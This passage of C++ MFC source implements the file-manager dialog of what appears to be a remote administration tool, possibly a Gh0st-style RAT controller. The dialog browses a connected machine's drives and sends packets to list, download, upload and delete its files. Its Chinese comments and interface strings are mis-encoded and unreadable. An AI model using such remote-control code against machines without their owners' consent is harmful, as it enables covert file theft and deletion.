                pList->RedrawItems(m_nDropIndex, m_nDropIndex);
                pList->UpdateWindow();
            }
        } else {
            // If we are not hovering over a CListCtrl, change the cursor
            // to note that we cannot drop here
            SetCursor(LoadCursor(NULL, IDC_NO));
        }
    }
    CDialog::OnMouseMove(nFlags, point);
}

// ���̧��
void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)
{
    // TODO: Add your message handler code here and/or call default
    // This routine is the end of the drag/drop operation.
    // When the button is released, we are to drop the item.
    // There are a few things we need to do to clean up and
    // finalize the drop:
    //	1) Release the mouse capture
    //	2) Set m_bDragging to false to signify we are not dragging
    //	3) Actually drop the item (we call a separate function to do that)

    //If we are in a drag and drop operation (otherwise we don't do anything)
    if (m_bDragging) {
        // Release mouse capture, so that other controls can get control/messages
        ReleaseCapture();

        // Note that we are NOT in a drag operation
        m_bDragging = FALSE;

        CPoint pt (point); //Get current mouse coordinates
        ClientToScreen (&pt); //Convert to screen coordinates
        // Get the CWnd pointer of the window that is under the mouse cursor
        CWnd* pDropWnd = WindowFromPoint (pt);
        ASSERT (pDropWnd); //make sure we have a window pointer
        // If window is CListCtrl, we perform the drop
        if (pDropWnd->IsKindOf (RUNTIME_CLASS (CListCtrl))) {
            m_pDropList = (CListCtrl*)pDropWnd; //Set pointer to the list we are dropping on
            DropItemOnList(m_pDragList, m_pDropList); //Call routine to perform the actual drop
        }
    }
    CDialog::OnLButtonUp(nFlags, point);
}

BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg)
{
    // TODO: Add your specialized code here and/or call the base class
    if (pMsg->message == WM_KEYDOWN) {
        if (pMsg->wParam == VK_ESCAPE) {
            if (!m_strOperatingFile.IsEmpty()) {
                AfxMessageBox("");
            }
            return true;
        }
        // ����ǻس� �ж�list �����ļ��б�
        if (pMsg->wParam == VK_RETURN) {
            if (
                pMsg->hwnd == m_list_local.m_hWnd ||
                pMsg->hwnd == ((CEdit*)m_Local_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
            ) {
                FixedLocalFileList();
            } else if
            (
                pMsg->hwnd == m_list_remote.m_hWnd ||
                pMsg->hwnd == ((CEdit*)m_Remote_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
            ) {
                GetRemoteFileList();
            }
            return TRUE;
        }

    }
    // �������˴��ڱ��������������ʹ�����ƶ�
    if (pMsg->message == WM_LBUTTONDOWN && pMsg->hwnd == m_hWnd) {
        pMsg->message = WM_NCLBUTTONDOWN;
        pMsg->wParam = HTCAPTION;
    }

    if(m_wndToolBar_Local.IsWindowVisible()) {
        CWnd* pWndParent = m_wndToolBar_Local.GetParent();
        m_wndToolBar_Local.OnUpdateCmdUI();
    }
    if(m_wndToolBar_Remote.IsWindowVisible()) {
        CWnd* pWndParent = m_wndToolBar_Remote.GetParent();
        m_wndToolBar_Remote.OnUpdateCmdUI();
    }

    return CDialog::PreTranslateMessage(pMsg);
}

// ��ʾԶ�������б�
void CFileManagerDlg::FixedRemoteDriveList()
{
    m_list_remote.DeleteAllItems();
    // �ؽ�Column
    while(m_list_remote.DeleteColumn(0) != 0);
    m_list_remote.InsertColumn(0, "����",  LVCFMT_LEFT, 200);
    m_list_remote.InsertColumn(1, "����", LVCFMT_LEFT, 100);
    m_list_remote.InsertColumn(2, "�ܴ�С", LVCFMT_LEFT, 100);
    m_list_remote.InsertColumn(3, "���ÿռ�", LVCFMT_LEFT, 115);


    char	*pDrive = NULL;
    pDrive = (char *)m_bRemoteDriveList;

    unsigned long		AmntMB = 0; // �ܴ�С
    unsigned long		FreeMB = 0; // ʣ��ռ�

    int	nIconIndex = -1;
    for (int i = 0; pDrive[i] != '\0';) {
        if (pDrive[i] == 'A' || pDrive[i] == 'B') {
            nIconIndex = 6;
        } else {
            switch (pDrive[i + 1]) {
            case DRIVE_REMOVABLE:
                nIconIndex = 7;
                break;
            case DRIVE_FIXED:
                nIconIndex = 8;
                break;
            case DRIVE_REMOTE:
                nIconIndex = 9;
                break;
            case DRIVE_CDROM:
                nIconIndex = 11;
                break;
            default:
                nIconIndex = 8;
                break;
            }
        }
        CString	str;
        str.Format(_T("%c:\\"), pDrive[i]);
        int	nItem = m_list_remote.InsertItem(i, str, nIconIndex);
        m_list_remote.SetItemData(nItem, 1);

        memcpy(&AmntMB, pDrive + i + 2, 4);
        memcpy(&FreeMB, pDrive + i + 6, 4);
        str.Format(_T("%10.1f GB"), (float)AmntMB / 1024);
        m_list_remote.SetItemText(nItem, 2, str);
        str.Format(_T("%10.1f GB"), (float)FreeMB / 1024);
        m_list_remote.SetItemText(nItem, 3, str);

        i += 10;

//		char	*lpFileSystemName = NULL;
        char	*lpTypeName = NULL;

        lpTypeName = pDrive + i;
//		i += lstrlen(pDrive + i) + 1;
//		lpFileSystemName = pDrive + i;

        // ��������, Ϊ�վ���ʾ��������
// 		if (lstrlen(lpFileSystemName) == 0)
// 		{
        m_list_remote.SetItemText(nItem, 1, lpTypeName);
// 		}
// 		else
// 		{
// 			m_list_remote.SetItemText(nItem, 1, lpFileSystemName);
// 		}


        i += lstrlen(pDrive + i) + 1;
    }
    // ����Զ�̵�ǰ·��
    m_Remote_Path = "";
    m_Remote_Directory_ComboBox.ResetContent();

    strShowText.Format(_T("Զ��: װ��Ŀ¼ %s ���"), m_Remote_Path);
    PostMessage(WM_SHOW_MSG,0,0);
//	ShowMessage(_T("Զ��: װ��Ŀ¼ %s ���"), m_Remote_Path);
}

void CFileManagerDlg::OnClose()
{
    // TODO: Add your message handler code here and/or call default
    CoUninitialize();
    closesocket(m_pContext->m_Socket);

    delete m_ProgressCtrl;
    m_bOnClose = TRUE;
    CDialog::OnClose();
}

// ��ȡ��Ŀ¼
CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
    CString	strCurPath = strPath;
    int Index = strCurPath.ReverseFind('\\');
    if (Index == -1) {
        return strCurPath;
    }
    CString str = strCurPath.Left(Index);
    Index = str.ReverseFind('\\');
    if (Index == -1) {
        strCurPath = "";
        return strCurPath;
    }
    strCurPath = str.Left(Index);

    if(strCurPath.Right(1) != "\\")
        strCurPath += "\\";
    return strCurPath;
}

// ��ȡԶ���ļ��б�
void CFileManagerDlg::GetRemoteFileList(CString directory)
{
    if (directory.GetLength() == 0) {
        int	nItem = m_list_remote.GetSelectionMark();

        // �����ѡ�еģ���Ŀ¼
        if (nItem != -1) {
            if (m_list_remote.GetItemData(nItem) == 1) {
                directory = m_list_remote.GetItemText(nItem, 0);
            }
        }
        // ����Ͽ���õ�·��
        else {
            m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
        }
    }
    // �õ���Ŀ¼
    if (directory == "..") {
        m_Remote_Path = GetParentDirectory(m_Remote_Path);
    } else if (directory != ".") {
        m_Remote_Path += directory;
        if(m_Remote_Path.Right(1) != "\\")
            m_Remote_Path += "\\";
    }

    // ���������ĸ�Ŀ¼,���ش����б�
    if (m_Remote_Path.GetLength() == 0) {
        FixedRemoteDriveList();
        return;
    }

    // ��������ǰ��ջ�����
    int	PacketSize = m_Remote_Path.GetLength() + 2;
    BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, PacketSize);

    bPacket[0] = COMMAND_LIST_FILES;
    memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
    m_iocpServer->Send(m_pContext, bPacket, PacketSize);
    LocalFree(bPacket);

    m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
    m_Remote_Directory_ComboBox.SetCurSel(0);

    // �õ���������ǰ������
    m_list_remote.EnableWindow(FALSE);
    m_ProgressCtrl->SetPos(0);
}

// ˫��m_list_remote
void CFileManagerDlg::OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
    if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
        return;
    // TODO: Add your control notification handler code here
    GetRemoteFileList();
    *pResult = 0;
}

// ��ʾԶ���ļ��б�
void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
{
    // �ؽ�����
    m_list_remote.DeleteAllItems();
    while(m_list_remote.DeleteColumn(0) != 0);
    m_list_remote.InsertColumn(0, "����",  LVCFMT_LEFT, 200);
    m_list_remote.InsertColumn(1, "��С", LVCFMT_LEFT, 100);
    m_list_remote.InsertColumn(2, "����", LVCFMT_LEFT, 100);
    m_list_remote.InsertColumn(3, "�޸�����", LVCFMT_LEFT, 115);

    int	nItemIndex = 0;
    m_list_remote.SetItemData
    (
        m_list_remote.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
        1
    );
    /*
    ListView ������˸
    ��������ǰ��SetRedraw(FALSE)
    ���º����SetRedraw(TRUE)
    */
    m_list_remote.SetRedraw(FALSE);

    if (dwBufferLen != 0) {
        //
        for (int i = 0; i < 2; i++) {
            // ����Token����5�ֽ�
            char *pList = (char *)(pbBuffer + 1);
            for(char *pBase = pList; pList - pBase < dwBufferLen - 1;) {
                char	*pszFileName = NULL;
                DWORD	dwFileSizeHigh = 0; // �ļ����ֽڴ�С
                DWORD	dwFileSizeLow = 0; // �ļ����ֽڴ�С
                int		nItem = 0;
                bool	bIsInsert = false;
                FILETIME	ftm_strReceiveLocalFileTime;

                int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
                // i Ϊ 0 ʱ����Ŀ¼��iΪ1ʱ���ļ�
                bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
                pszFileName = ++pList;

                if (bIsInsert) {
                    nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
                    m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
                    SHFILEINFO	sfi;
                    SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
                    m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
                }

                // �õ��ļ���С
                pList += lstrlen(pszFileName) + 1;
                if (bIsInsert) {
                    memcpy(&dwFileSizeHigh, pList, 4);
                    memcpy(&dwFileSizeLow, pList + 4, 4);
                    CString strSize;
                    strSize.Format(_T("%10d KB"), (dwFileSizeHigh * (MAXDWORD)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
                    m_list_remote.SetItemText(nItem, 1, strSize);
                    memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
                    CTime	time(ftm_strReceiveLocalFileTime);
                    m_list_remote.SetItemText(nItem, 3, time.Format(_T("%Y-%m-%d %H:%M")));
                }
                pList += 16;
            }
        }
    }

    m_list_remote.SetRedraw(TRUE);
    // �ָ�����
    m_list_remote.EnableWindow(TRUE);

    strShowText.Format(_T("Զ��: װ��Ŀ¼ %s ���"), m_Remote_Path);
    PostMessage(WM_SHOW_MSG,0,0);
//	ShowMessage(_T("Զ��: װ��Ŀ¼ %s ���"), m_Remote_Path);
}

// ��ʾ��Ϣ
LRESULT CFileManagerDlg::OnShowMessage(WPARAM wParam,LPARAM lParam)
{
    m_wndStatusBar.SetPaneText(0, strShowText);
    return TRUE;
}
// ��ʾ�Ի���
LRESULT CFileManagerDlg::OnShowDlg(WPARAM wParam,LPARAM lParam)
{
    //����Լ�����Ϣ����
    CFileTransferModeDlg	dlg(this);
    if (bIsLocalDlg)
        dlg.m_strFileName = m_strReceiveLocalFile;
    else
        dlg.m_strFileName = m_strUploadRemoteFile;
    switch (dlg.DoModal()) {
    case IDC_OVERWRITE:
        m_nTransferMode = TRANSFER_MODE_OVERWRITE;
        break;
    case IDC_OVERWRITE_ALL:
        m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
        break;
    case IDC_ADDITION:
        m_nTransferMode = TRANSFER_MODE_ADDITION;
        break;
    case IDC_ADDITION_ALL:
        m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
        break;
    case IDC_JUMP:
        m_nTransferMode = TRANSFER_MODE_JUMP;
        break;
    case IDC_JUMP_ALL:
        m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
        break;
    case IDC_CANCEL:
        m_nTransferMode = TRANSFER_MODE_CANCEL;
        break;
    }

    return TRUE;
}

// void CFileManagerDlg::ShowMessage(char *lpFmt, ...)
// {
// 	char buff[1024];
//     va_list    arglist;
//     va_start( arglist, lpFmt );
//
// 	memset(buff, 0, sizeof(buff));
//
// 	vsprintf(buff, lpFmt, arglist);
// 	m_wndStatusBar.SetPaneText(0, buff);
//     va_end( arglist );
// }

//////////////////////////////////����Ϊ��������Ӧ����//////////////////////////////////////////
void CFileManagerDlg::OnLocalList()
{
    // TODO: Add your command handler code here
    m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
}

void CFileManagerDlg::OnLocalReport()
{
    // TODO: Add your command handler code here
    m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
}

void CFileManagerDlg::OnLocalBigicon()
{
    // TODO: Add your command handler code here
    m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}

void CFileManagerDlg::OnLocalSmallicon()
{
    // TODO: Add your command handler code here
    m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
}

void CFileManagerDlg::OnRemoteList()
{
    // TODO: Add your command handler code here
    if (m_list_remote.IsWindowVisible())
        m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
    else
        m_list_remote_search.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
}

void CFileManagerDlg::OnRemoteReport()
{
    // TODO: Add your command handler code here
    if (m_list_remote.IsWindowVisible())
        m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
    else
        m_list_remote_search.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
}

void CFileManagerDlg::OnRemoteBigicon()
{
    // TODO: Add your command handler code here
    if (m_list_remote.IsWindowVisible())
        m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
    else
        m_list_remote_search.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}

void CFileManagerDlg::OnRemoteSmallicon()
{
    // TODO: Add your command handler code here
    if (m_list_remote.IsWindowVisible())
        m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
    else
        m_list_remote_search.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
}

void CFileManagerDlg::OnRemoteView()
{
    // TODO: Add your command handler code here
    if (m_list_remote.IsWindowVisible())
        m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
    else
        m_list_remote_search.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}

// ������-----�����ļ��б��ظ�Ŀ¼
void CFileManagerDlg::OnLocalPrev()
{
    // TODO: Add your command handler code here
    FixedLocalFileList(_T(".."));
}
// Զ���ļ��б��ظ�Ŀ¼
void CFileManagerDlg::OnRemotePrev()
{
    // TODO: Add your command handler code here
    GetRemoteFileList(_T(".."));
}
// �����ļ��б� ��ʾ��ͼ��
void CFileManagerDlg::OnLocalView()
{
    // TODO: Add your command handler code here
    m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}
/////////////////////////��������Ӧ����/////////////////////////////////////////////////

/////////////////////////����Ϊ��������ť�Ƿ����õĴ���/////////////////////////////////////////////////
void CFileManagerDlg::OnUpdateLocalPrev(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    // Ϊ��Ŀ¼ʱ�������ϰ�ť
    pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateLocalDelete(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    // ���Ǹ�Ŀ¼������ѡ����Ŀ����0
    pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.GetSelectedCount()  && m_list_local.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateLocalNewfolder(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateLocalCopy(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    if (m_list_remote_search.IsWindowVisible()) {
        pCmdUI->Enable(FALSE);
        return;
    }
    pCmdUI->Enable
    (
        m_list_local.IsWindowEnabled()
        && (m_Remote_Path.GetLength() || m_list_remote.GetSelectedCount()) // Զ��·��Ϊ�գ�������ѡ��
        && m_list_local.GetSelectedCount()// ����·��Ϊ�գ�������ѡ��
    );
}

void CFileManagerDlg::OnUpdateLocalStop(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    pCmdUI->Enable(!m_list_local.IsWindowEnabled() && m_bIsUpload);
}

void CFileManagerDlg::OnUpdateRemotePrev(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    if (m_list_remote_search.IsWindowVisible()) {
        pCmdUI->Enable(FALSE);
        return;
    }
    pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteCopy(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    // ���Ǹ�Ŀ¼������ѡ����Ŀ����0
    if (m_list_remote_search.IsWindowVisible()) {
        pCmdUI->Enable
        (
            m_list_remote_search.IsWindowEnabled()
            && (m_Local_Path.GetLength() || m_list_local.GetSelectedCount()) // ����·��Ϊ�գ�������ѡ��
            && m_list_remote_search.GetSelectedCount() // Զ��·��Ϊ�գ�������ѡ��
        );
        return;
    }

    pCmdUI->Enable
    (
        m_list_remote.IsWindowEnabled()
        && (m_Local_Path.GetLength() || m_list_local.GetSelectedCount()) // ����·��Ϊ�գ�������ѡ��
        && m_list_remote.GetSelectedCount() // Զ��·��Ϊ�գ�������ѡ��
    );
}

void CFileManagerDlg::OnUpdateRemoteDelete(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    if (m_list_remote_search.IsWindowVisible()) {
        pCmdUI->Enable(m_list_remote_search.GetSelectedCount() && m_list_remote_search.IsWindowEnabled());
        return;
    }
    // ���Ǹ�Ŀ¼������ѡ����Ŀ����0
    pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.GetSelectedCount() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteNewfolder(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    if (m_list_remote_search.IsWindowVisible()) {
        pCmdUI->Enable(FALSE);
        return;
    }
    pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteStop(CCmdUI* pCmdUI)
{
    // TODO: Add your command update UI handler code here
    if (m_list_remote_search.IsWindowVisible()) {
        pCmdUI->Enable(!m_list_remote_search.IsWindowEnabled() && !m_bIsUpload);
        return;
    }

    pCmdUI->Enable(!m_list_remote.IsWindowEnabled() && !m_bIsUpload);
}

///////////////////////////////----����----///////////////////////////////////////////

// �����ݹ鱾��Ŀ¼ ���ҵ����ļ������ϴ�����
bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
{
    char	lpszFilter[MAX_PATH];
    char	*lpszSlash = NULL;
    memset(lpszFilter, 0, sizeof(lpszFilter));

    // ���·��������\��β
    if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
        lpszSlash = "\\";
    else
        lpszSlash = "";

    // ·��\*.*
    wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);

    WIN32_FIND_DATA	wfd;
    HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
    if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
        return FALSE;

    do {
        if (wfd.cFileName[0] == '.')
            continue; // ����������Ŀ¼
        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            char strDirectory[MAX_PATH];
            wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
            FixedUploadDirectory(strDirectory); // ����ҵ�����Ŀ¼��������Ŀ¼���еݹ�
        } else {
            // ���ļ����в���
            CString file;
            file.Format(_T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
            m_Remote_Upload_Job.AddTail(file);  // ����ҵ������ļ� �ͼ����ϴ�����
        }
    } while (FindNextFile(hFind, &wfd));
    FindClose(hFind); // �رղ��Ҿ��
    return true;
}

// �ڴ����ļ�ʱ ���ÿؼ�
void CFileManagerDlg::EnableControl(BOOL bEnable)
{
    m_list_local.EnableWindow(bEnable);
    m_list_remote.EnableWindow(bEnable);
    m_list_remote_search.EnableWindow(bEnable);

    m_Local_Directory_ComboBox.EnableWindow(bEnable);
    m_Remote_Directory_ComboBox.EnableWindow(bEnable);

    m_wndToolBar_Search.EnableWindow(bEnable);
}

// �����ļ��ϴ���Զ��
void CFileManagerDlg::OnLocalCopy()
{
    if (!m_list_remote.IsWindowVisible())
        return;

    m_bIsUpload = true;
    // TODO: Add your command handler code here
    // ���Drag�ģ��ҵ�Drop�����ĸ��ļ���
    if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
        m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
    // �����ϴ������б�
    m_Remote_Upload_Job.RemoveAll();
    POSITION pos = m_list_local.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
    while(pos) { //so long as we have a valid POSITION, we keep iterating
        int nItem = m_list_local.GetNextSelectedItem(pos);
        CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
        // �����Ŀ¼
        if (m_list_local.GetItemData(nItem)) {
            file += '\\';
            FixedUploadDirectory(file.GetBuffer(0));
        } else {
            // ��ӵ��ϴ������б���ȥ
            m_Remote_Upload_Job.AddTail(file);
        }

    } //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
    if (m_Remote_Upload_Job.IsEmpty()) {
        ::MessageBox(m_hWnd, "�ļ���Ϊ��", "����", MB_OK|MB_ICONWARNING);
        return;
    }
    EnableControl(FALSE);
    SendUploadJob();
}

//////////////// �ļ�������� ////////////////
// ֻ�ܷ��������ص��ļ�
// һ��һ���������յ��������ʱ�����صڶ����ļ� ...
void CFileManagerDlg::OnRemoteCopy()
{
    m_bIsUpload = false;
    // �����ļ�������
    EnableControl(FALSE);

    // TODO: Add your command handler code here
    // ���Drag�ģ��ҵ�Drop�����ĸ��ļ���
    if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
        m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
    // �������������б�
    m_Remote_Download_Job.RemoveAll();
    if (m_list_remote_search.IsWindowVisible()) {
        POSITION pos = m_list_remote_search.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
        while(pos) { //so long as we have a valid POSITION, we keep iterating
            int nItem = m_list_remote_search.GetNextSelectedItem(pos);
            CString	file = m_list_remote_search.GetItemText(nItem, 0);
            // �����Ŀ¼
            if (m_list_remote_search.GetItemData(nItem))
                file += '\\';
            // ��ӵ����������б���ȥ
            m_Remote_Download_Job.AddTail(file);
        } //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

    } else {
        POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
        while(pos) { //so long as we have a valid POSITION, we keep iterating
            int nItem = m_list_remote.GetNextSelectedItem(pos);
            CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
            // �����Ŀ¼
            if (m_list_remote.GetItemData(nItem))
                file += '\\';
            // ��ӵ����������б���ȥ
            m_Remote_Download_Job.AddTail(file);
        } //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
    }

    // ���͵�һ����������
    SendDownloadJob();
}

// ����һ����������
BOOL CFileManagerDlg::SendDownloadJob()
{
    if (m_Remote_Download_Job.IsEmpty())
        return FALSE;

    // ������һ��������������
    CString file = m_Remote_Download_Job.GetHead();
    int		nPacketSize = file.GetLength() + 2;
    BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
    bPacket[0] = COMMAND_DOWN_FILES;
    // �ļ�ƫ�ƣ�����ʱ��
    memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
    m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

    LocalFree(bPacket);
    // �����������б���ɾ���Լ�
    m_Remote_Download_Job.RemoveHead();
    return TRUE;
}

// ����һ���ϴ�����
BOOL CFileManagerDlg::SendUploadJob()
{
    if (m_Remote_Upload_Job.IsEmpty())
        return FALSE;

    CString strDestDirectory = m_Remote_Path;
    // ���Զ��Ҳ��ѡ�񣬵���Ŀ���ļ���
    int nItem = m_list_remote.GetSelectionMark();

    if (!m_hCopyDestFolder.IsEmpty()) { //�޸�Ŀ¼�ظ���bug
        strDestDirectory += m_hCopyDestFolder + "\\";
    } else if (nItem != -1 && m_list_remote.GetItemData(nItem) == 1) { // ���ļ���
        strDestDirectory += m_list_remote.GetItemText(nItem, 0) + "\\";
    }//���޸�

    if (!m_hCopyDestFolder.IsEmpty()) {
        strDestDirectory += m_hCopyDestFolder + "\\";
    }

    // ������һ��������������
    m_strOperatingFile = m_Remote_Upload_Job.GetHead();

    DWORD	dwSizeHigh;
    DWORD	dwSizeLow;
    // 1 �ֽ�token, 8�ֽڴ�С, �ļ�����, '\0'
    HANDLE	hFile;
    CString	fileRemote = m_strOperatingFile; // Զ���ļ�
    // �õ�Ҫ���浽��Զ�̵��ļ�·��
    fileRemote.Replace(m_Local_Path, strDestDirectory);
    m_strUploadRemoteFile = fileRemote;
    hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        TRACE("CFileManagerDlg SendUploadJob ERRO 0\r\n");

        // �����������б���ɾ���Լ�
        m_Remote_Upload_Job.RemoveHead();

        EndLocalUploadFile();
        return FALSE;
    }
    dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
    m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD)) + dwSizeLow;

    CloseHandle(hFile);
    // �������ݰ��������ļ�����
    int		nPacketSize = fileRemote.GetLength() + 10;
    BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
    memset(bPacket, 0, nPacketSize);

    bPacket[0] = COMMAND_FILE_SIZE;
    memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
    memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
    memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);

    m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

    LocalFree(bPacket);

    // �����������б���ɾ���Լ�
    m_Remote_Upload_Job.RemoveHead();
    return TRUE;
}

// ����һ��ɾ������
BOOL CFileManagerDlg::SendDeleteJob()
{
    if (m_Remote_Delete_Job.IsEmpty())
        return FALSE;
    // ������һ��������������
    CString file = m_Remote_Delete_Job.GetHead();
    int		nPacketSize = file.GetLength() + 2;
    BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);

    if (file.GetAt(file.GetLength() - 1) == '\\') {
        strShowText.Format(_T("Զ�̣�ɾ��Ŀ¼ %s\\*.* ���"), file);
        //ShowMessage(_T("Զ�̣�ɾ��Ŀ¼ %s\\*.* ���"), file);
        bPacket[0] = COMMAND_DELETE_DIRECTORY;
    } else {
        strShowText.Format(_T("Զ�̣�ɾ���ļ� %s ���"), file);
        //ShowMessage(_T("Զ�̣�ɾ���ļ� %s ���"), file);
        bPacket[0] = COMMAND_DELETE_FILE;
    }
    // �ļ�ƫ�ƣ�����ʱ��
    memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
    m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

    LocalFree(bPacket);
    // �����������б���ɾ���Լ�
    if (m_list_remote_search.IsWindowVisible()) {
        int nCount = m_list_remote_search.GetItemCount();
        CString str;

        for (int i=0; i < nCount; i++) {
            str = 	m_list_remote_search.GetItemText(i, 0);
            if (m_Remote_Delete_Job.GetHead() == str) {
                strShowText.Format(_T("Զ�̣�ɾ���ļ� %s ���"), str);
                m_list_remote_search.DeleteItem(i);
            } else
                continue;
        }
    }
    m_Remote_Delete_Job.RemoveHead();

    PostMessage(WM_SHOW_MSG,0,0);
    return TRUE;
}

void CFileManagerDlg::CreateLocalRecvFile()
{
    // ���ü�����
    m_nCounter = 0;


    FILESIZE	*pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
    DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
    DWORD	dwSizeLow = pFileSize->dwSizeLow;
    //���ڲ������ļ���С
    m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD)) + dwSizeLow;


    // ��ǰ���������ļ���
    m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);
    m_strReceiveLocalFile = m_strOperatingFile;

    // �������Ŀ¼Ϊ�� �ʹ�������������Ŀ¼
    CString strDestDirectory = m_Local_Path;

    int nItem = m_list_local.GetSelectionMark();
    if (!m_hCopyDestFolder.IsEmpty()) { // �������ק��ĳ�ļ���
        strDestDirectory += m_hCopyDestFolder + "\\";
    } else if (nItem != -1 && m_list_local.GetItemData(nItem) == 1) { // ����Ѿ�ѡ�����ļ���
        strDestDirectory += m_list_local.GetItemText(nItem, 0) + "\\";
    }

    // �õ�Ҫ���浽�ı��ص��ļ�·��
    if (m_list_remote_search.IsWindowVisible()) {
        int nPos = m_strReceiveLocalFile.ReverseFind('\\');

